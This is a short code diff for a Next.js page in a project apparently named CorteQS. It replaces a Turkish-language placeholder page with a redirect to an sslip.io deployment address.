@@ -1,20 +1,5 @@
-﻿export const metadata = {
-  title: "CorteQS | Site",
-};
+﻿import { redirect } from "next/navigation";
 
 export default function SitePage() {
-  return (
-    <main className="page-shell">
-      <section className="section-card">
-        <p className="eyebrow">/site</p>
-        <h1>Site Sayfası Hazır</h1>
-        <p className="lead">
-          Bu alan sonra kullanılmak üzere oluşturuldu. İçerikler bir sonraki adımda eklenecek.
-        </p>
-        <a href="/" className="btn btn-secondary">
-          Ana Sayfaya Dön
-        </a>
-      </section>
-    </main>
-  );
+  redirect("http://oxku901h1n2cjm08ir9hhbl8.87.106.222.106.sslip.io/");
 }
